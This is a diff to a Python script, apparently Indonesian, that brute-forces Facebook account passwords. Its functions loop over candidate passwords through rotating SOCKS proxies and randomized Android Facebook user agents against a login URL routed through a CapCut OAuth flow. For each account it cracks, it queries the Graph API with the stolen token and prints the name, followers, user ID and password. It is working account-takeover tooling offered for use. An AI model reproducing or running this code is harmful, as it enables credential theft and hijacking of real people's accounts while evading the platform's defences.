@@ -776,7 +776,7 @@ def crackvalidate(idf,pwx,url):
 	prog.advance(des)
 	for pw in pwx:
 		try:
-			ua = uaku()
+			ua = random.choice(["Mozilla/5.0 (Linux; Android 11; Redmi Note 9 Pro Build/RKQ1.201217.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/82.0.1531.64 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/FBAV/411.0.0.13.36;]","Mozilla/5.0 (Linux; Android 10; Redmi Note 8 Pro Build/OPR6.142770.293; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/94.0.2114.112 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/FBAV/348.0.0.12.57;]","Mozilla/5.0 (Linux; Android 9; Redmi 9 Build/OPR6.142770.293; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.1518.41 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/FBAV/343.0.0.03.54;]","Mozilla/5.0 (Linux; Android 11; Redmi K40 Build/SP2A.653342.342; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/95.0.2318.41 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/FBAV/136.0.0.14.72;]","Mozilla/5.0 (Linux; Android 9; Redmi Note 7 Build/TP1A.904992.769; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/74.0.1431.179 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/FBAV/156.0.0.23.66;]","Mozilla/5.0 (Linux; Android 11; Redmi Note 9 Build/RKQ1.201217.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/93.0.1734.2 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/FBAV/321.0.0.02.33;]","Mozilla/5.0 (Linux; Android 11; Redmi Note 8 Build/SD2A.276412.601; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/95.0.1576.83 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/FBAV/469.0.0.23.21;]","Mozilla/5.0 (Linux; Android 10; Redmi K40 Build/SP2A.653342.342; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.139.83 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/FBAV/334.0.0.15.5;]","Mozilla/5.0 (Linux; Android 11; Redmi Note 9 Pro Build/RKQ1.201217.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.2051.117 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/FBAV/486.0.0.21.67;]","Mozilla/5.0 (Linux; Android 9; Redmi Note 8 Pro Build/RKQ1.201217.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/67.0.78.94 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/FBAV/218.0.0.15.17;]"])
 			#ua2 = ("Mozilla/5.0 (iPhone; CPU iPhone OS 13_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Mobile/15E148 Safari/604.1","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edg/91.0.864.59")
 			link = ses.get("https://m.prod.facebook.com/login.php?skip_api_login=1&api_key=3213804762189845&kid_directed_site=0&app_id=3213804762189845&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv3.1%2Fdialog%2Foauth%3Fclient_id%3D3213804762189845%26redirect_uri%3Dhttps%253A%252F%252Fwww.capcut.com%252Fpassport%252Fweb%252Fweb_login_success%26scope%3Demail%26state%3D0053afca3gAToVCgoVPZIGY3NGIxZTM4YjU5Zjg5ZmNkNTkxNWUyZWZmNzMyYjQxoU7ZOmh0dHBzOi8vd3d3LmNhcGN1dC5jb20vbHYvdjEvdXNlci93ZWIvbG9naW4vdGhpcmRfY2FsbGJhY2uhVgGhSQChRAChQdIABVAcoU0AoUiud3d3LmNhcGN1dC5jb22hUgKiUEzRBuymQUNUSU9OqXVuZGVmaW5lZKFM2SJodHRwczovL3d3dy5jYXBjdXQuY29tL2lkLWlkL2xvZ2luoVTZIDJkNzg1MGFiZmFiODNjNWUxYjU2MGExODBjYzA3YzcwoVcAoUYAolNBAKFVwqJNTMI%25253D%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Daf919600-a681-4aeb-a128-05e90339859f%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.capcut.com%2Fpassport%2Fweb%2Fweb_login_success%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D0053afca3gAToVCgoVPZIGY3NGIxZTM4YjU5Zjg5ZmNkNTkxNWUyZWZmNzMyYjQxoU7ZOmh0dHBzOi8vd3d3LmNhcGN1dC5jb20vbHYvdjEvdXNlci93ZWIvbG9naW4vdGhpcmRfY2FsbGJhY2uhVgGhSQChRAChQdIABVAcoU0AoUiud3d3LmNhcGN1dC5jb22hUgKiUEzRBuymQUNUSU9OqXVuZGVmaW5lZKFM2SJodHRwczovL3d3dy5jYXBjdXQuY29tL2lkLWlkL2xvZ2luoVTZIDJkNzg1MGFiZmFiODNjNWUxYjU2MGExODBjYzA3YzcwoVcAoUYAolNBAKFVwqJNTMI%25253D%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr")
 			date = (
@@ -828,8 +828,8 @@ def crackvalidate(idf,pwx,url):
 				urlb = f"https://graph.facebook.com/{idf}?fields=name,followers&access_token={token}"
 				response = requests.get(urlb)
 				data = response.json()
-				name = data.get('name', 'N/A')
-				followers_count = data.get('followers', {}).get('summary', {}).get('total_count', 'N/A')
+				name = data.get('name')
+				followers_count = data.get('followers', {}).get('summary', {}).get('total_count')
 				print(f"\n⌲ Name: {hijo}{name}{puti}")
 				print(f"⌲ Followers: {hijo}{followers_count}{puti}")
 				print(f"⌲ User ID: {hijo}{idf}{puti}")
@@ -845,10 +845,10 @@ def crackvalidate(idf,pwx,url):
 				urlb = f"https://graph.facebook.com/{idf}?fields=name,followers&access_token={token}"
 				response = requests.get(urlb)
 				data = response.json()
-				name = data.get('name', 'N/A')
-				followers_count = data.get('followers', {}).get('summary', {}).get('total_count', 'N/A')
-				print(f"\n⌲ Name: {hijo}{name}{puti}")
-				print(f"⌲ Followers: {hijo}{followers_count}{puti}")
+				name = data.get('name')
+				followers_count = data.get('followers', {}).get('summary', {}).get('total_count')
+				print(f"\n⌲ Name: {kun}{name}{puti}")
+				print(f"⌲ Followers: {kun}{followers_count}{puti}")
 				print(f"⌲ User ID: {kun}{idf}{puti}")
 				print(f"⌲ Password: {kun}{pw}{puti}")
 				print(f"⌲ Tahun: {mer}{tahun(idf)}{puti}")
@@ -880,7 +880,7 @@ def crackreguler(idf,pwx,url):
 			open('socks4.txt','w').write(proxs)
 			nip = rc(proxs)
 			proxs = {'http': 'socks5://'+nip}
-			ua = uaku()
+			ua = random.choice(["Mozilla/5.0 (Linux; Android 11; Redmi Note 9 Pro Build/RKQ1.201217.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/82.0.1531.64 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/FBAV/411.0.0.13.36;]","Mozilla/5.0 (Linux; Android 10; Redmi Note 8 Pro Build/OPR6.142770.293; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/94.0.2114.112 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/FBAV/348.0.0.12.57;]","Mozilla/5.0 (Linux; Android 9; Redmi 9 Build/OPR6.142770.293; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.1518.41 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/FBAV/343.0.0.03.54;]","Mozilla/5.0 (Linux; Android 11; Redmi K40 Build/SP2A.653342.342; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/95.0.2318.41 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/FBAV/136.0.0.14.72;]","Mozilla/5.0 (Linux; Android 9; Redmi Note 7 Build/TP1A.904992.769; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/74.0.1431.179 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/FBAV/156.0.0.23.66;]","Mozilla/5.0 (Linux; Android 11; Redmi Note 9 Build/RKQ1.201217.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/93.0.1734.2 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/FBAV/321.0.0.02.33;]","Mozilla/5.0 (Linux; Android 11; Redmi Note 8 Build/SD2A.276412.601; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/95.0.1576.83 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/FBAV/469.0.0.23.21;]","Mozilla/5.0 (Linux; Android 10; Redmi K40 Build/SP2A.653342.342; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.139.83 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/FBAV/334.0.0.15.5;]","Mozilla/5.0 (Linux; Android 11; Redmi Note 9 Pro Build/RKQ1.201217.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.2051.117 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/FBAV/486.0.0.21.67;]","Mozilla/5.0 (Linux; Android 9; Redmi Note 8 Pro Build/RKQ1.201217.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/67.0.78.94 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/FBAV/218.0.0.15.17;]"])
 			ses.headers.update(
 			{
 			"Host":url,
@@ -928,8 +928,8 @@ def crackreguler(idf,pwx,url):
 				urlb = f"https://graph.facebook.com/{idf}?fields=name,followers&access_token={token}"
 				response = requests.get(urlb)
 				data = response.json()
-				name = data.get('name', 'N/A')
-				followers_count = data.get('followers', {}).get('summary', {}).get('total_count', 'N/A')
+				name = data.get('name')
+				followers_count = data.get('followers', {}).get('summary', {}).get('total_count')
 				print(f"\n⌲ Name: {hijo}{name}{puti}")
 				print(f"⌲ Followers: {hijo}{followers_count}{puti}")
 				print(f"⌲ User ID: {hijo}{idf}{puti}")
@@ -945,10 +945,10 @@ def crackreguler(idf,pwx,url):
 				urlb = f"https://graph.facebook.com/{idf}?fields=name,followers&access_token={token}"
 				response = requests.get(urlb)
 				data = response.json()
-				name = data.get('name', 'N/A')
-				followers_count = data.get('followers', {}).get('summary', {}).get('total_count', 'N/A')
-				print(f"\n⌲ Name: {hijo}{name}{puti}")
-				print(f"⌲ Followers: {hijo}{followers_count}{puti}")
+				name = data.get('name')
+				followers_count = data.get('followers', {}).get('summary', {}).get('total_count')
+				print(f"\n⌲ Name: {kun}{name}{puti}")
+				print(f"⌲ Followers: {kun}{followers_count}{puti}")
 				print(f"⌲ User ID: {kun}{idf}{puti}")
 				print(f"⌲ Password: {kun}{pw}{puti}")
 				print(f"⌲ Tahun: {mer}{tahun(idf)}{puti}")
